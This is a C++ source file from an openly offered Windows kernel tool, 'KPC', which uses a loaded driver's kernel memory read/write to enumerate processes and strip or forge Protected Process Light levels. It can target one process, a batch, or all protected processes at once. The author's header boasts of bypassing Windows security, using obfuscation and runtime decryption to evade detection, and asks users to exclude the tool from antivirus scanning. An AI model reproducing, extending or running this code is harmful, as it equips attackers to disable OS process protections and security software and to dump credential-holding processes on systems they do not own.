/*******************************************************************************
				██  ██ ██████  ████ 
				██ ██  ██  ██ ██    
				████   ██████ ██    
				██ ██  ██     ██    
				██  ██ ██      ████ 

  KPC - Kernel Process Control
  Advanced Windows Process Protection and Memory Dumping Tool
  Features Dynamic Kernel Driver Loading with Automatic Cleanup
  Achieves TrustedInstaller-level access bypassing Windows security restrictions

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

  -----------------------------------------------------------------------------
  License:
    KPC Custom License 1.0
    - Free for personal, non-commercial and academic use
    - A commercial license is required for business, enterprise or
      revenue-generating activities
    - Redistribution of source code allowed only with this header intact
    - The XOR decryption key for embedded drivers is not provided

  -----------------------------------------------------------------------------
DISCLAIMER:
    This software operates at Windows kernel level with elevated privileges.
    While designed to be safe, conflicts with antivirus software may cause
    system instability or BSOD. For optimal operation, add kpc.exe to your
    security software's exclusion list for both files and processes.
    
    The tool employs advanced anti-analysis techniques including XOR-based 
    string obfuscation, dynamic API loading, and runtime decryption to prevent
    static detection. All critical elements are reconstructed in memory only
    when needed, ensuring minimal security solution interference.
    
    Use responsibly. Author assumes no liability for system conflicts or misuse.

*******************************************************************************/

#include "Controller.h"
#include "common.h"
#include "Utils.h"
#include <regex>
#include <charconv>
#include <tlhelp32.h>
#include <unordered_map>

extern volatile bool g_interrupted;

// ======================= Kernel Process Operations =======================

std::optional<ULONG_PTR> Controller::GetInitialSystemProcessAddress() noexcept {
    auto kernelBase = Utils::GetKernelBaseAddress();
    if (!kernelBase) return std::nullopt;

    auto offset = m_of->GetOffset(Offset::KernelPsInitialSystemProcess);
    if (!offset) return std::nullopt;

    ULONG_PTR pPsInitialSystemProcess = Utils::GetKernelAddress(kernelBase.value(), offset.value());
    return m_rtc->ReadPtr(pPsInitialSystemProcess);
}

std::optional<ULONG_PTR> Controller::GetProcessKernelAddress(DWORD pid) noexcept {
    auto processes = GetProcessList();
    for (const auto& entry : processes) {
        if (entry.Pid == pid)
            return entry.KernelAddress;
    }
    
    ERROR(OBFERR(L"Failed to find kernel address for PID %d").c_str(), pid);
    return std::nullopt;
}

std::vector<ProcessEntry> Controller::GetProcessList() noexcept {
    std::vector<ProcessEntry> processes;
    
    // Early interruption check - before starting expensive enumeration
    if (g_interrupted) {
        INFO(OBFINFO(L"Process enumeration cancelled by user before start").c_str());
        return processes;
    }
    
    auto initialProcess = GetInitialSystemProcessAddress();
    if (!initialProcess) return processes;

    auto uniqueIdOffset = m_of->GetOffset(Offset::ProcessUniqueProcessId);
    auto linksOffset = m_of->GetOffset(Offset::ProcessActiveProcessLinks);
    
    if (!uniqueIdOffset || !linksOffset) return processes;

    ULONG_PTR current = initialProcess.value();
    DWORD processCount = 0;

    do {
        // Critical interruption check in enumeration loop - can be long operation
        if (g_interrupted) {
            DEBUG(OBFINFO(L"Process enumeration cancelled by user (found %d processes so far)").c_str(), processCount);
            break; // Exit gracefully, return partial results
        }

        auto pidPtr = m_rtc->ReadPtr(current + uniqueIdOffset.value());
        
        // Check interruption before expensive protection read operation
        if (g_interrupted) {
            DEBUG(OBFINFO(L"Process enumeration cancelled during PID read (processed %d entries)").c_str(), processCount);
            break;
        }
        
        auto protection = GetProcessProtection(current);
        
        std::optional<UCHAR> signatureLevel = std::nullopt;
        std::optional<UCHAR> sectionSignatureLevel = std::nullopt;
        
        auto sigLevelOffset = m_of->GetOffset(Offset::ProcessSignatureLevel);
        auto secSigLevelOffset = m_of->GetOffset(Offset::ProcessSectionSignatureLevel);
        
        // Check interruption before signature level reads
        if (g_interrupted) {
            DEBUG(OBFINFO(L"Process enumeration cancelled during signature read (processed %d entries)").c_str(), processCount);
            break;
        }
        
        if (sigLevelOffset)
            signatureLevel = m_rtc->Read8(current + sigLevelOffset.value());
        if (secSigLevelOffset)
            sectionSignatureLevel = m_rtc->Read8(current + secSigLevelOffset.value());
        
        if (pidPtr && protection) {
            ULONG_PTR pidValue = pidPtr.value();
            
            if (pidValue > 0 && pidValue <= MAXDWORD) {
                ProcessEntry entry{};
                entry.KernelAddress = current;
                entry.Pid = static_cast<DWORD>(pidValue);
                entry.ProtectionLevel = Utils::GetProtectionLevel(protection.value());
                entry.SignerType = Utils::GetSignerType(protection.value());
                entry.SignatureLevel = signatureLevel.value_or(0);
                entry.SectionSignatureLevel = sectionSignatureLevel.value_or(0);
                
                // Check interruption before expensive process name resolution
                if (g_interrupted) {
                    DEBUG(OBFINFO(L"Process enumeration cancelled during name resolution (processed %d entries)").c_str(), processCount);
                    break;
                }
                
                std::wstring basicName = Utils::GetProcessName(entry.Pid);
                
                auto unknownProcess = OBFPROC(L"[Unknown]");
                if (basicName == unknownProcess) {
                    entry.ProcessName = Utils::ResolveUnknownProcessLocal(
                        entry.Pid, 
                        entry.KernelAddress, 
                        entry.ProtectionLevel, 
                        entry.SignerType
                    );
                } else {
                    entry.ProcessName = basicName;
                }
                
                processes.push_back(entry);
                processCount++; // Increment counter for safety check only
            }
        }

        // Final interruption check before advancing to next process
        if (g_interrupted) {
            DEBUG(OBFINFO(L"Process enumeration cancelled before advancing to next process (found %d total)").c_str(), processCount);
            break;
        }

        auto nextPtr = m_rtc->ReadPtr(current + linksOffset.value());
        if (!nextPtr) break;
        
        current = nextPtr.value() - linksOffset.value();
        
        // Safety check: prevent infinite loops and respect interruption
        if (processCount >= 10000) {
            DEBUG(OBFINFO(L"Process enumeration stopped at safety limit (10,000 processes)").c_str());
            break;
        }
        
    } while (current != initialProcess.value() && !g_interrupted);

    // Final status message - only for debug builds or when interrupted
    if (g_interrupted) {
        DEBUG(OBFINFO(L"Process enumeration interrupted by user - returning %d partial results").c_str(), processCount);
    }

    return processes;
}

std::optional<UCHAR> Controller::GetProcessProtection(ULONG_PTR addr) noexcept {
    auto offset = m_of->GetOffset(Offset::ProcessProtection);
    if (!offset) return std::nullopt;
    
    return m_rtc->Read8(addr + offset.value());
}

bool Controller::SetProcessProtection(ULONG_PTR addr, UCHAR protection) noexcept {
    auto offset = m_of->GetOffset(Offset::ProcessProtection);
    if (!offset) return false;

    return m_rtc->Write8(addr + offset.value(), protection);
}

// ======================= Process Name Resolution with Driver =======================

std::optional<ProcessMatch> Controller::ResolveProcessName(const std::wstring& processName) noexcept {
    // Always use atomic operation - load, execute, cleanup
    if (!PerformAtomicInitWithErrorCleanup()) {
        return std::nullopt;
    }
    
    auto matches = FindProcessesByName(processName);
    
    if (matches.empty()) {
        ERROR(OBFERR(L"No process found matching pattern: %s").c_str(), processName.c_str());
        PerformAtomicCleanup();
        return std::nullopt;
    }
    
    if (matches.size() == 1) {
        INFO(OBFINFO(L"Found process: %s (PID %d)").c_str(), matches[0].ProcessName.c_str(), matches[0].Pid);
        PerformAtomicCleanup(); // Always cleanup after operation
        return matches[0];
    }
    
    ERROR(OBFERR(L"Multiple processes found matching pattern '%s'. Please use a more specific name:").c_str(), processName.c_str());
    for (const auto& match : matches) {
        std::wcout << OBFINFO(L"  PID ") << match.Pid << OBFINFO(L": ") << match.ProcessName << L"\n";
    }
    
    PerformAtomicCleanup(); // Always cleanup
    return std::nullopt;
}

std::vector<ProcessMatch> Controller::FindProcessesByName(const std::wstring& pattern) noexcept {
    std::vector<ProcessMatch> matches;
    auto processes = GetProcessList();
    
    for (const auto& entry : processes) {
        if (IsPatternMatch(entry.ProcessName, pattern)) {
            ProcessMatch match;
            match.Pid = entry.Pid;
            match.ProcessName = entry.ProcessName;
            match.KernelAddress = entry.KernelAddress;
            matches.push_back(match);
        }
    }
    
    return matches;
}

// ======================= Process Name Resolution (Driver-Free) =======================

std::optional<ProcessMatch> Controller::ResolveNameWithoutDriver(const std::wstring& processName) noexcept {
    auto matches = FindProcessesByNameWithoutDriver(processName);
    
    if (matches.empty()) {
        ERROR(OBFERR(L"No process found matching pattern: %s").c_str(), processName.c_str());
        return std::nullopt;
    }
    
    if (matches.size() == 1) {
        INFO(OBFINFO(L"Found process: %s (PID %d)").c_str(), matches[0].ProcessName.c_str(), matches[0].Pid);
        return matches[0];
    }
    
    ERROR(OBFERR(L"Multiple processes found matching pattern '%s'. Please use a more specific name:").c_str(), processName.c_str());
    for (const auto& match : matches) {
        std::wcout << OBFINFO(L"  PID ") << match.Pid << OBFINFO(L": ") << match.ProcessName << L"\n";
    }
    
    return std::nullopt;
}

std::vector<ProcessMatch> Controller::FindProcessesByNameWithoutDriver(const std::wstring& pattern) noexcept {
    std::vector<ProcessMatch> matches;
    
    // Use process snapshot instead of kernel driver for lightweight resolution
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return matches;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            std::wstring processName = pe.szExeFile;
            
            if (IsPatternMatch(processName, pattern)) {
                ProcessMatch match;
                match.Pid = pe.th32ProcessID;
                match.ProcessName = processName;
                match.KernelAddress = 0; // Will be resolved by atomic operation if needed
                matches.push_back(match);
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    return matches;
}

bool Controller::IsPatternMatch(const std::wstring& processName, const std::wstring& pattern) noexcept {
    std::wstring lowerProcessName = processName;
    std::wstring lowerPattern = pattern;
    
    std::transform(lowerProcessName.begin(), lowerProcessName.end(), lowerProcessName.begin(), ::towlower);
    std::transform(lowerPattern.begin(), lowerPattern.end(), lowerPattern.begin(), ::towlower);
    
    // Exact match check
    if (lowerProcessName == lowerPattern) return true;
    
    // Partial match check
    if (lowerProcessName.find(lowerPattern) != std::wstring::npos) return true;
    
    // Wildcard pattern matching with regex
    std::wstring regexPattern = lowerPattern;
    auto specialChars = OBFSTR("\\^$.+{}[]|()");
    std::wstring specialCharsW(specialChars.begin(), specialChars.end());
    
    for (auto& ch : regexPattern) {
        if (specialCharsW.find(ch) != std::wstring::npos) {
            regexPattern = std::regex_replace(regexPattern, std::wregex(std::wstring(1, ch)), OBFPATH(L"\\") + std::wstring(1, ch));
        }
    }
    
    regexPattern = std::regex_replace(regexPattern, std::wregex(OBFPATH(L"\\*")), OBFPATH(L".*"));
    
    try {
        std::wregex regex(regexPattern, std::regex_constants::icase);
        return std::regex_search(lowerProcessName, regex);
    } catch (const std::regex_error&) {
        return false;
    }
}

// ======================= Process Information Operations (Atomic) =======================

bool Controller::GetProcessProtection(DWORD pid) noexcept {
    // Check if driver is already loaded (from previous operation)
    bool driverWasLoaded = IsDriverCurrentlyLoaded();
    bool needsCleanup = false;
    
    if (!driverWasLoaded) {
        if (!PerformAtomicInitWithErrorCleanup()) {
            return false;
        }
        needsCleanup = true; // Mark that we loaded the driver
    }
    
    // Perform actual operations instead of diagnostic test
    auto kernelAddr = GetProcessKernelAddress(pid);
    if (!kernelAddr) {
        ERROR(OBFERR(L"Failed to get kernel address for PID %d").c_str(), pid);
        if (needsCleanup) PerformAtomicCleanup();
        return false;
    }
    
    auto currentProtection = GetProcessProtection(kernelAddr.value());
    if (!currentProtection) {
        ERROR(OBFERR(L"Failed to read protection for PID %d").c_str(), pid);
        if (needsCleanup) PerformAtomicCleanup();
        return false;
    }
    
    // Display protection information
    UCHAR protLevel = Utils::GetProtectionLevel(currentProtection.value());
    UCHAR signerType = Utils::GetSignerType(currentProtection.value());
    
    if (currentProtection.value() == 0) {
        INFO(OBFINFO(L"PID %d (%s) is not protected").c_str(), pid, Utils::GetProcessName(pid).c_str());
    } else {
        INFO(OBFINFO(L"PID %d (%s) protection: %s-%s (raw: 0x%02x)").c_str(), 
             pid, 
             Utils::GetProcessName(pid).c_str(),
             Utils::GetProtectionLevelAsString(protLevel),
             Utils::GetSignerTypeAsString(signerType),
             currentProtection.value());
    }
    
    // Cleanup only if we loaded the driver
    if (needsCleanup) {
        PerformAtomicCleanup();
    }
    
    return true;
}

bool Controller::GetProcessProtectionByName(const std::wstring& processName) noexcept {
    // Use driver-free resolution, then atomic operation
    auto match = ResolveNameWithoutDriver(processName);
    if (!match) {
        return false;
    }
    
    return GetProcessProtection(match->Pid);
}

// ======================= Process Information Display (Atomic) =======================

bool Controller::ListProtectedProcesses() noexcept {
    // Atomic operation: cleanup → load → execute → cleanup
    if (!PerformAtomicInitWithErrorCleanup()) {
        return false;
    }
    
    auto processes = GetProcessList();
    DWORD count = 0;

    // Enable console color support for enhanced output
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD consoleMode = 0;
    GetConsoleMode(hConsole, &consoleMode);
    SetConsoleMode(hConsole, consoleMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);

    // Color codes for different protection levels and states
    auto GREEN = OBFPATH(L"\033[92m");    // System processes
    auto YELLOW = OBFPATH(L"\033[93m");   // User processes with protection
    auto BLUE = OBFPATH(L"\033[94m");     // Processes with unchecked signatures
    auto HEADER = OBFPATH(L"\033[97;44m"); // Table header
    auto RESET = OBFPATH(L"\033[0m");     // Reset color

    // Display formatted table header
    std::wcout << GREEN;
    std::wcout << OBFINFO(L"\n -------+------------------------------+---------+-----------------+-----------------------+-----------------------+--------------------\n");
    std::wcout << HEADER;
    std::wcout << OBFINFO(L"   PID  |         Process Name         |  Level  |     Signer      |     EXE sig. level    |     DLL sig. level    |    Kernel addr.    ");
    std::wcout << RESET << L"\n";
    std::wcout << GREEN;
    std::wcout << OBFINFO(L" -------+------------------------------+---------+-----------------+-----------------------+-----------------------+--------------------\n");

    // Display protected processes with color coding
    for (const auto& entry : processes) {
        if (entry.ProtectionLevel > 0) {
            const wchar_t* processColor = GREEN.c_str();
            
            // Determine color based on signature verification status
            bool hasUncheckedSignatures = (entry.SignatureLevel == 0x00 || entry.SectionSignatureLevel == 0x00);

            if (hasUncheckedSignatures) {
                processColor = BLUE.c_str(); // Processes with bypass potential
            } else {
                // Check if it's a user process vs system process
                bool isUserProcess = (entry.SignerType != static_cast<UCHAR>(PS_PROTECTED_SIGNER::Windows) &&
                                      entry.SignerType != static_cast<UCHAR>(PS_PROTECTED_SIGNER::WinTcb) &&
                                      entry.SignerType != static_cast<UCHAR>(PS_PROTECTED_SIGNER::WinSystem) &&
                                      entry.SignerType != static_cast<UCHAR>(PS_PROTECTED_SIGNER::Lsa));
                processColor = isUserProcess ? YELLOW.c_str() : GREEN.c_str();
            }

            std::wcout << processColor;
            wchar_t buffer[512];
            auto formatString = OBFINFO(L" %6d | %-28s | %-3s (%d) | %-11s (%d) | %-14s (0x%02x) | %-14s (0x%02x) | 0x%016llx\n");
            swprintf_s(buffer, formatString.c_str(),
                       entry.Pid,
                       entry.ProcessName.c_str(),
                       Utils::GetProtectionLevelAsString(entry.ProtectionLevel),
                       entry.ProtectionLevel,
                       Utils::GetSignerTypeAsString(entry.SignerType),
                       entry.SignerType,
                       Utils::GetSignatureLevelAsString(entry.SignatureLevel),
                       entry.SignatureLevel,
                       Utils::GetSignatureLevelAsString(entry.SectionSignatureLevel),
                       entry.SectionSignatureLevel,
                       entry.KernelAddress);
            std::wcout << buffer;
            count++;
        }
    }

    std::wcout << GREEN;
    std::wcout << OBFINFO(L" -------+------------------------------+---------+-----------------+-----------------------+-----------------------+--------------------\n");
    std::wcout << RESET << L"\n";

    SUCCESS(OBFSUCCESS(L"Enumerated %d protected processes").c_str(), count);
    
    // Immediate cleanup after operation
    PerformAtomicCleanup();
    
    return true;
}

// ======================= Process Protection Operations (Atomic) =======================

bool Controller::UnprotectProcess(DWORD pid) noexcept {
    // Atomic operation: cleanup → load → execute → cleanup
    if (!PerformAtomicInitWithErrorCleanup()) {
        return false;
    }
    
    auto kernelAddr = GetProcessKernelAddress(pid);
    if (!kernelAddr) {
        PerformAtomicCleanup();
        return false;
    }

    auto currentProtection = GetProcessProtection(kernelAddr.value());
    if (!currentProtection) {
        PerformAtomicCleanup();
        return false;
    }

    if (currentProtection.value() == 0) {
        ERROR(OBFERR(L"PID %d is not protected").c_str(), pid);
        PerformAtomicCleanup();
        return false;
    }

    if (!SetProcessProtection(kernelAddr.value(), 0)) {
        ERROR(OBFERR(L"Failed to remove protection from PID %d").c_str(), pid);
        PerformAtomicCleanup();
        return false;
    }

    SUCCESS(OBFSUCCESS(L"Removed protection from PID %d").c_str(), pid);
    
    // Immediate cleanup after operation
    PerformAtomicCleanup();
    
    return true;
}

bool Controller::ProtectProcess(DWORD pid, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept {
    // Atomic operation: cleanup → load → execute → cleanup
    if (!PerformAtomicInitWithErrorCleanup()) {
        return false;
    }
    
    auto kernelAddr = GetProcessKernelAddress(pid);
    if (!kernelAddr) {
        PerformAtomicCleanup();
        return false;
    }

    auto currentProtection = GetProcessProtection(kernelAddr.value());
    if (!currentProtection) {
        PerformAtomicCleanup();
        return false;
    }

    if (currentProtection.value() > 0) {
        ERROR(OBFERR(L"PID %d is already protected").c_str(), pid);
        PerformAtomicCleanup();
        return false;
    }

    auto level = Utils::GetProtectionLevelFromString(protectionLevel);
    auto signer = Utils::GetSignerTypeFromString(signerType);
    
    if (!level || !signer) {
        ERROR(OBFERR(L"Invalid protection level or signer type").c_str());
        PerformAtomicCleanup();
        return false;
    }

    UCHAR newProtection = Utils::GetProtection(level.value(), signer.value());
    if (!SetProcessProtection(kernelAddr.value(), newProtection)) {
        ERROR(OBFERR(L"Failed to protect PID %d").c_str(), pid);
        PerformAtomicCleanup();
        return false;
    }

    SUCCESS(OBFSUCCESS(L"Protected PID %d with %s-%s").c_str(), pid, protectionLevel.c_str(), signerType.c_str());
    
    // Immediate cleanup after operation
    PerformAtomicCleanup();
    
    return true;
}

bool Controller::SetProcessProtection(DWORD pid, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept {
    // Atomic operation: cleanup → load → execute → cleanup
    if (!PerformAtomicInitWithErrorCleanup()) {
        return false;
    }
    
    auto level = Utils::GetProtectionLevelFromString(protectionLevel);
    auto signer = Utils::GetSignerTypeFromString(signerType);
    
    if (!level || !signer) {
        ERROR(OBFERR(L"Invalid protection level or signer type").c_str());
        PerformAtomicCleanup();
        return false;
    }

    auto kernelAddr = GetProcessKernelAddress(pid);
    if (!kernelAddr) {
        PerformAtomicCleanup();
        return false;
    }

    UCHAR newProtection = Utils::GetProtection(level.value(), signer.value());
    
    if (!SetProcessProtection(kernelAddr.value(), newProtection)) {
        ERROR(OBFERR(L"Failed to set protection on PID %d").c_str(), pid);
        PerformAtomicCleanup();
        return false;
    }

    SUCCESS(OBFSUCCESS(L"Set protection %s-%s on PID %d").c_str(), protectionLevel.c_str(), signerType.c_str(), pid);
    
    // Immediate cleanup after operation
    PerformAtomicCleanup();
    
    return true;
}

// ======================= Mass Protection Operations (Atomic) =======================

bool Controller::UnprotectAllProcesses() noexcept {
    // Atomic operation: cleanup → load → execute → cleanup
    if (!PerformAtomicInitWithErrorCleanup()) {
        return false;
    }
    
    auto processes = GetProcessList();
    DWORD totalCount = 0;
    DWORD successCount = 0;
    
    INFO(OBFINFO(L"Starting mass unprotection of all protected processes...").c_str());
    
    for (const auto& entry : processes) {
        if (entry.ProtectionLevel > 0) {
            totalCount++;
            
            if (SetProcessProtection(entry.KernelAddress, 0)) {
                successCount++;
                SUCCESS(OBFSUCCESS(L"Removed protection from PID %d (%s)").c_str(), entry.Pid, entry.ProcessName.c_str());
            } else {
                ERROR(OBFERR(L"Failed to remove protection from PID %d (%s)").c_str(), entry.Pid, entry.ProcessName.c_str());
            }
        }
    }
    
    if (totalCount == 0) {
        INFO(OBFINFO(L"No protected processes found").c_str());
    } else {
        INFO(OBFINFO(L"Mass unprotection completed: %d/%d processes successfully unprotected").c_str(), successCount, totalCount);
    }
    
    // Immediate cleanup after operation
    PerformAtomicCleanup();
    
    return successCount == totalCount;
}

bool Controller::UnprotectMultipleProcesses(const std::vector<std::wstring>& targets) noexcept {
    if (targets.empty()) {
        ERROR(OBFERR(L"No targets specified for batch unprotection").c_str());
        return false;
    }
    
    // Atomic operation: cleanup → load → execute → cleanup
    if (!PerformAtomicInitWithErrorCleanup()) {
        return false;
    }
    
    DWORD successCount = 0;
    DWORD totalCount = static_cast<DWORD>(targets.size());
    
    INFO(OBFINFO(L"Starting batch unprotection of %d targets...").c_str(), totalCount);
    
    for (const auto& target : targets) {
        bool result = false;
        
        if (Utils::IsNumeric(target)) {
            auto pid = Utils::ParsePid(target);
            if (pid) {
                auto kernelAddr = GetProcessKernelAddress(pid.value());
                if (kernelAddr) {
                    auto currentProtection = GetProcessProtection(kernelAddr.value());
                    if (currentProtection && currentProtection.value() > 0) {
                        if (SetProcessProtection(kernelAddr.value(), 0)) {
                            SUCCESS(OBFSUCCESS(L"Removed protection from PID %d").c_str(), pid.value());
                            result = true;
                        } else {
                            ERROR(OBFERR(L"Failed to remove protection from PID %d").c_str(), pid.value());
                        }
                    } else {
                        INFO(OBFINFO(L"PID %d is not protected").c_str(), pid.value());
                        result = true; // Not an error if already unprotected
                    }
                }
            } else {
                ERROR(OBFERR(L"Invalid PID format: %s").c_str(), target.c_str());
            }
        } else {
            // For process names, use the already loaded driver to find matches
            auto matches = FindProcessesByName(target);
            if (matches.size() == 1) {
                auto match = matches[0];
                auto currentProtection = GetProcessProtection(match.KernelAddress);
                if (currentProtection && currentProtection.value() > 0) {
                    if (SetProcessProtection(match.KernelAddress, 0)) {
                        SUCCESS(OBFSUCCESS(L"Removed protection from %s (PID %d)").c_str(), match.ProcessName.c_str(), match.Pid);
                        result = true;
                    } else {
                        ERROR(OBFERR(L"Failed to remove protection from %s (PID %d)").c_str(), match.ProcessName.c_str(), match.Pid);
                    }
                } else {
                    INFO(OBFINFO(L"%s (PID %d) is not protected").c_str(), match.ProcessName.c_str(), match.Pid);
                    result = true; // Not an error if already unprotected
                }
            } else {
                ERROR(OBFERR(L"Could not resolve process name: %s").c_str(), target.c_str());
            }
        }
        
        if (result) successCount++;
    }
    
    INFO(OBFINFO(L"Batch unprotection completed: %d/%d targets successfully processed").c_str(), successCount, totalCount);
    
    // Immediate cleanup after operation
    PerformAtomicCleanup();
    
    return successCount == totalCount;
}

// ======================= Process Name-Based Operations (Composite Pattern) =======================

bool Controller::ProtectProcessByName(const std::wstring& processName, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept {
    // Composite: Resolve name without driver, let ProtectProcess handle atomic operations
    auto match = ResolveNameWithoutDriver(processName);
    if (!match) {
        return false;
    }
    
    return ProtectProcess(match->Pid, protectionLevel, signerType);
}

bool Controller::UnprotectProcessByName(const std::wstring& processName) noexcept {
    // Composite: Resolve name without driver, let UnprotectProcess handle atomic operations
    auto match = ResolveNameWithoutDriver(processName);
    if (!match) {
        return false;
    }
    
    return UnprotectProcess(match->Pid);
}

bool Controller::SetProcessProtectionByName(const std::wstring& processName, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept {
    // Composite: Resolve name without driver, let SetProcessProtection handle atomic operations
    auto match = ResolveNameWithoutDriver(processName);
    if (!match) {
        return false;
    }
    
    return SetProcessProtection(match->Pid, protectionLevel, signerType);
}
